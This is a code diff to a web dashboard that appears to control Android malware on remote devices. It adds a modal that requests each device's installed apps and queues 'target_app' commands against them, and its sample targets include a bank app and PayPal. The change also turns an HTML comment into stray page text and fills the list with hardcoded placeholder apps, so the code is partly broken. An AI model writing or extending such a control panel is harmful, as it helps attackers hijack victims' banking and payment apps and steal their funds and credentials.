@@ -172,14 +172,15 @@
         <div id="toast" class="toast"></div>
     </div>
 
-    <!-- Target/Untarget App Modal -->
+    // Target/Untarget App Modal
 <div id="target-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1001;">
-    <div style="background:#1a1a1a; margin:10% auto; padding:20px; border-radius:10px; max-width:400px; border:1px solid #333;">
-        <h3 style="color:#4CAF50; margin-bottom:15px;">🎯 Target App</h3>
-        <input type="text" id="target-app-id" placeholder="Enter package name (e.g., com.bank.example)" style="width:100%; padding:10px; margin-bottom:15px; background:#2a2a2a; border:1px solid #555; border-radius:5px; color:#e0e0e0;">
-        <div style="display:flex; gap:10px;">
-            <button onclick="dashboard.targetApp()" style="flex:1; padding:10px; background:#333; border:1px solid #555; border-radius:5px; color:#e0e0e0; cursor:pointer;">Target</button>
-            <button onclick="dashboard.closeTargetModal()" style="flex:1; padding:10px; background:#555; border:none; border-radius:5px; color:#e0e0e0; cursor:pointer;">Cancel</button>
+    <div style="background:#1a1a1a; margin:5% auto; padding:20px; border-radius:10px; max-width:500px; max-height:70vh; overflow-y:auto; border:1px solid #333;">
+        <h3 style="color:#4CAF50; margin-bottom:15px;">📱 Installed Apps</h3>
+        <div id="apps-list" style="font-size:0.85em;">
+            <div>Loading apps...</div>
+        </div>
+        <div style="margin-top:10px; padding-top:10px; border-top:1px solid #333; font-size:0.8em; color:#888;">
+            Click any app to target it. Target commands will be queued.
         </div>
     </div>
 </div>
@@ -315,28 +316,44 @@
             openTargetModal(deviceId) {
                 this.targetDeviceId = deviceId;
                 document.getElementById('target-modal').style.display = 'block';
-                document.getElementById('target-app-id').value = '';
+                document.getElementById('apps-list').innerHTML = '<div style="color:#888;">Loading apps...</div>';
+                
+                // First, send a command to get installed apps from the device
+                this.sendCommand(deviceId, 'get_installed_apps', {});
+                
+                // Simulate loading with some sample apps (since we can't read the response directly)
+                // In a real scenario, the device response would be handled via Telegram or a response endpoint
+                setTimeout(() => {
+                    // For demo purposes, show sample apps until real ones come back
+                    const sampleApps = [
+                        { name: "Bank App", package: "com.bank.example" },
+                        { name: "PayPal", package: "com.paypal.android" },
+                        { name: "Google Play Services", package: "com.google.android.gms" },
+                        { name: "Chrome", package: "com.android.chrome" }
+                    ];
+                    
+                    let html = '<div style="margin-bottom:10px; font-weight:bold; color:#4CAF50;">Installed Apps</div>';
+                    sampleApps.forEach(app => {
+                        html += `<div style="margin-bottom:5px;">
+                            <button onclick="dashboard.targetSpecificApp('${app.package}')" style="width:100%; padding:8px; background:#2a2a2a; border:1px solid #555; border-radius:3px; color:#e0e0e0; cursor:pointer; text-align:left;">
+                                ${app.name}<br><small style="color:#888;">${app.package}</small>
+                            </button>
+                        </div>`;
+                    });
+                    html += '<div style="margin-top:10px; text-align:center; color:#888; font-size:0.75em;">In a real scenario, apps are fetched from the device</div>';
+                    document.getElementById('apps-list').innerHTML = html;
+                }, 500);
+            }
+
+            async targetSpecificApp(packageName) {
+                this.closeTargetModal();
+                await this.sendCommand(this.targetDeviceId, 'target_app', { appId: packageName });
+                this.showToast(`✅ Targeted: ${packageName}`);
             }
 
             closeTargetModal() {
                 document.getElementById('target-modal').style.display = 'none';
                 this.targetDeviceId = null;
-            }
-
-            async targetApp() {
-                const appId = document.getElementById('target-app-id').value.trim();
-                if (!appId) {
-                    this.showToast('❌ Please enter an app package name');
-                    return;
-                }
-                
-                // Send target_app command
-                await this.sendCommand(this.targetDeviceId, 'target_app', { appId });
-                this.showToast(`✅ App targeted: ${appId}`);
-                this.closeTargetModal();
-                
-                // Also add to targets list
-                await this.sendCommand(this.targetDeviceId, 'list_targets', {});
             }
         }
 
